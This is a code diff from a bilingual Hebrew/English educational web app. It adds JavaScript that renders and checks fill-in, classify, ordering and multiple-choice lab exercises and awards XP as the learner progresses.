+          oninput="fillCheck(${chId},${i},${fi})" autocomplete="off" spellcheck="false">
+        <span class="fill-icon" id="fill-icon-${chId}-${i}-${fi}"></span>
+      </div>
+    </div>`).join('');
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.fill}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    <div class="fill-fields">${fields}</div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+
+function fillCheck(chId, i, fi) {
+  const exs = getL(chId);
+  const f = exs[i].fields[fi];
+  const inp = document.getElementById(`fill-inp-${chId}-${i}-${fi}`);
+  const icon = document.getElementById(`fill-icon-${chId}-${i}-${fi}`);
+  const row = document.getElementById(`fill-row-${chId}-${i}-${fi}`);
+  if (!inp) return;
+  const val = inp.value.trim().toLowerCase();
+  const alts = (f.alt || []).map(a => a.toLowerCase());
+  const ok = val === f.answer.toLowerCase() || alts.includes(val);
+  row.className = 'fill-row' + (val.length===0?'': ok?' fill-correct':' fill-wrong');
+  icon.textContent = val.length===0?'': ok?'✓':'';
+  const allOk = exs[i].fields.every((ff, ffi) => {
+    const v = (document.getElementById(`fill-inp-${chId}-${i}-${ffi}`)?.value||'').trim().toLowerCase();
+    return v === ff.answer.toLowerCase() || (ff.alt||[]).map(a=>a.toLowerCase()).includes(v);
+  });
+  if (allOk) markLabDone(chId, i);
+}
+
+function renderClassify(chId, i, ex, Lc, T, total) {
+  const shuffled = [...ex.items].sort(() => Math.random() - 0.5);
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.classify}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    ${ex.desc?`<div class="lab-desc">${ex.desc}</div>`:''}
+    <div class="classify-pool" id="pool-${chId}-${i}">
+      ${shuffled.map(item=>`<button class="classify-chip" id="chip-${chId}-${i}-${item.id}" onclick="classifySelect(${chId},${i},'${item.id}')">${esc(item.text)}</button>`).join('')}
+    </div>
+    <div class="classify-cats">
+      ${ex.categories.map((cat,ci)=>`
+        <div class="classify-cat" onclick="classifyDrop(${chId},${i},${ci})">
+          <div class="classify-cat-title">${cat}</div>
+          <div class="classify-cat-zone" id="zone-${chId}-${i}-${ci}"></div>
+        </div>`).join('')}
+    </div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+
+const _csel = {};
+function classifySelect(chId, i, itemId) {
+  _csel[`${chId}-${i}`] = itemId;
+  document.querySelectorAll(`#pool-${chId}-${i} .classify-chip, #labcard-${chId}-${i} .classify-drop-chip`).forEach(c=>c.classList.remove('selected'));
+  document.getElementById(`chip-${chId}-${i}-${itemId}`)?.classList.add('selected');
+}
+function classifyDrop(chId, i, ci) {
+  const key = `${chId}-${i}`;
+  const itemId = _csel[key]; if(!itemId) return;
+  const ex = getL(chId)[i];
+  const item = ex.items.find(it=>it.id===itemId); if(!item) return;
+  const ok = item.ans === ex.catKeys[ci];
+  document.getElementById(`chip-${chId}-${i}-${itemId}`)?.remove();
+  const zone = document.getElementById(`zone-${chId}-${i}-${ci}`);
+  if (zone) {
+    const chip = document.createElement('span');
+    chip.className = 'classify-drop-chip ' + (ok?'drop-correct':'drop-wrong');
+    chip.textContent = (ok?'✓ ':'✗ ') + item.text;
+    chip.onclick = () => { chip.remove(); const pool=document.getElementById(`pool-${chId}-${i}`); if(pool){const b=document.createElement('button');b.className='classify-chip';b.id=`chip-${chId}-${i}-${itemId}`;b.textContent=item.text;b.onclick=()=>classifySelect(chId,i,itemId);pool.appendChild(b);} };
+    zone.appendChild(chip);
+  }
+  delete _csel[key];
+  const allPlaced = ex.items.every(it => !document.getElementById(`chip-${chId}-${i}-${it.id}`));
+  if (allPlaced) {
+    const allOk = ex.items.every(it => { const ci2=ex.catKeys.indexOf(it.ans); const z=document.getElementById(`zone-${chId}-${i}-${ci2}`); return z && [...z.querySelectorAll('.drop-correct')].some(c=>c.textContent.includes(it.text)); });
+    document.getElementById(`labexp-${chId}-${i}`)?.style && (document.getElementById(`labexp-${chId}-${i}`).style.display='block');
+    if (allOk) markLabDone(chId, i);
+  }
+}
+
+function renderOrder(chId, i, ex, Lc, T, total) {
+  const shuffled = [...ex.items].sort(() => Math.random() - 0.5);
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.order}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    ${ex.desc?`<div class="lab-desc">${ex.desc}</div>`:''}
+    <div class="order-pool" id="orderpool-${chId}-${i}">
+      ${shuffled.map(item=>`<button class="order-item" id="oitem-${chId}-${i}-${item.id}" onclick="orderClick(${chId},${i},'${item.id}')">${esc(item.text)}</button>`).join('')}
+    </div>
+    <div class="order-sequence">
+      <div class="order-seq-label">${T.orderSeq}</div>
+      <div class="order-seq-zone" id="orderseq-${chId}-${i}"></div>
+    </div>
+    <button class="btn btn-ghost" style="margin-top:8px;font-size:11px" onclick="orderCheck(${chId},${i})">${T.orderCheck}</button>
+    <div class="order-feedback" id="orderfb-${chId}-${i}"></div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+
+const _ostate = {};
+function orderClick(chId, i, itemId) {
+  const key=`${chId}-${i}`; if(!_ostate[key]) _ostate[key]=[];
+  if(_ostate[key].includes(itemId)) return;
+  _ostate[key].push(itemId);
+  const btn = document.getElementById(`oitem-${chId}-${i}-${itemId}`);
+  if(btn){btn.classList.add('order-selected');btn.disabled=true;}
+  const zone = document.getElementById(`orderseq-${chId}-${i}`);
+  if(zone){const s=document.createElement('div');s.className='order-seq-step';s.dataset.id=itemId;s.innerHTML=`<span class="order-seq-num">${_ostate[key].length}</span> ${btn?.textContent||''}`;s.onclick=()=>orderRemove(chId,i,itemId);zone.appendChild(s);}
+}
+function orderRemove(chId, i, itemId) {
+  const key=`${chId}-${i}`; if(!_ostate[key]) return;
+  _ostate[key]=_ostate[key].filter(id=>id!==itemId);
+  const btn=document.getElementById(`oitem-${chId}-${i}-${itemId}`);
+  if(btn){btn.classList.remove('order-selected');btn.disabled=false;}
+  const zone=document.getElementById(`orderseq-${chId}-${i}`);
+  if(zone){const s=zone.querySelector(`[data-id="${itemId}"]`);if(s)s.remove();zone.querySelectorAll('.order-seq-step').forEach((st,idx)=>{const n=st.querySelector('.order-seq-num');if(n)n.textContent=idx+1;});}
+}
+function orderCheck(chId, i) {
+  const key=`${chId}-${i}`;
+  const ex=getL(chId)[i];
+  const chosen=_ostate[key]||[];
+  const fb=document.getElementById(`orderfb-${chId}-${i}`);
+  const isHe=currentLang==='he';
+  if(chosen.length<ex.correct.length){if(fb){fb.textContent=isHe?`⚠️ בחרי את כל ${ex.correct.length} השלבים`:`⚠️ Select all ${ex.correct.length} steps`;fb.className='order-feedback warn';}return;}
+  const ok=ex.correct.every((id,idx)=>chosen[idx]===id);
+  if(fb){fb.textContent=ok?'✅ '+(isHe?'מצוין! סדר נכון.':'Correct! Perfect order.'):'❌ '+(isHe?'לא בדיוק. נסי שוב.':'Not quite. Try again.');fb.className='order-feedback '+(ok?'ok':'err');}
+  if(ok){document.getElementById(`labexp-${chId}-${i}`)?.style&&(document.getElementById(`labexp-${chId}-${i}`).style.display='block');markLabDone(chId,i);}
+  else setTimeout(()=>{_ostate[key]=[];const zone=document.getElementById(`orderseq-${chId}-${i}`);if(zone)zone.innerHTML='';document.getElementById(`orderpool-${chId}-${i}`)?.querySelectorAll('.order-item').forEach(b=>{b.classList.remove('order-selected');b.disabled=false;});if(fb){fb.textContent='';fb.className='order-feedback';}},1300);
+}
+
+function renderMChoice(chId, i, ex, Lc, T, total) {
+  return `<div class="lab-card" id="labcard-${chId}-${i}">
+    <div class="lab-card-hdr"><span class="lab-type-badge">${T.mchoice}</span><span class="lab-card-num">${i+1}/${total}</span></div>
+    <div class="lab-card-q">${ex.q}</div>
+    <div class="mch-opts">
+      ${ex.options.map((opt,oi)=>`
+        <button class="mch-opt" id="mchopt-${chId}-${i}-${oi}" onclick="mchoicePick(${chId},${i},${oi})">
+          <span class="mch-letter">${Lc.optLetters[oi]}</span><span class="mch-text">${opt.text}</span>
+        </button>
+        <div class="mch-feedback" id="mchfb-${chId}-${i}-${oi}" style="display:none">${opt.feedback||''}</div>`).join('')}
+    </div>
+    <div class="lab-explain-box" id="labexp-${chId}-${i}" style="display:none"><strong>${Lc.labExplain}</strong> ${ex.explain||''}</div>
+  </div>`;
+}
+function mchoicePick(chId, i, oi) {
+  const ex=getL(chId)[i];
+  ex.options.forEach((_,idx)=>{const b=document.getElementById(`mchopt-${chId}-${i}-${idx}`);if(b)b.disabled=true;});
+  const opt=ex.options[oi];
+  document.getElementById(`mchfb-${chId}-${i}-${oi}`)?.style&&(document.getElementById(`mchfb-${chId}-${i}-${oi}`).style.display='block');
+  document.getElementById(`mchopt-${chId}-${i}-${oi}`)?.classList.add(opt.correct?'mch-correct':'mch-wrong');
+  if(!opt.correct) ex.options.forEach((o,idx)=>{if(o.correct){document.getElementById(`mchopt-${chId}-${i}-${idx}`)?.classList.add('mch-correct');document.getElementById(`mchfb-${chId}-${i}-${idx}`)?.style&&(document.getElementById(`mchfb-${chId}-${i}-${idx}`).style.display='block');}});
+  document.getElementById(`labexp-${chId}-${i}`)?.style&&(document.getElementById(`labexp-${chId}-${i}`).style.display='block');
+  if(opt.correct) markLabDone(chId,i);
+}
+
+const _labDone={};
+function markLabDone(chId,i){
+  if(!_labDone[chId]) _labDone[chId]=new Set();
+  if(_labDone[chId].has(i)) return;
+  _labDone[chId].add(i);
+  addXP(15);
+  document.getElementById(`labcard-${chId}-${i}`)?.classList.add('lab-card-done');
+  const total=getL(chId).length;
+  const done=_labDone[chId].size;
+  const fill=document.getElementById(`lab-prog-fill-${chId}`);
+  if(fill) fill.style.width=Math.round(done/total*100)+'%';
+  const label=document.getElementById(`lab-prog-label-${chId}`);
+  const Lc=L();
+  const T=currentLang==='he'?{complete:'הושלמו',allDone:'כל התרגילים הושלמו!'}:{complete:'completed',allDone:'All exercises done!'};
+  if(label) label.textContent=`${done}/${total} ${T.complete}`;
+  if(done===total){const banner=document.getElementById(`lab-done-${chId}`);if(banner)banner.style.display='flex';const txt=document.getElementById(`lab-done-txt-${chId}`);if(txt)txt.textContent=T.allDone+' +'+total*15+' XP';}
+}
 // ===== STATE =====
 const state = {cur:0, tabs:{}, quiz:{}, game:{}, xp:0, stars:{}};
 let currentLang = 'he';
@@ -1579,7 +2721,7 @@ function getQ(i) {
   }
   return _sqCache[key];
 }
-function getL(i) { return (currentLang==='en' ? (LABS_EN[i]||LABS[i]) : LABS[i]) || LABS[0]; }
+function getL(i) { return (currentLang==='en' ? (ILABS_EN[i]||ILABS[i]) : ILABS[i]) || ILABS[0]; }
 function getG(i) {
   const key = currentLang+'-g-'+i;
   if (!_sgCache[key]) {
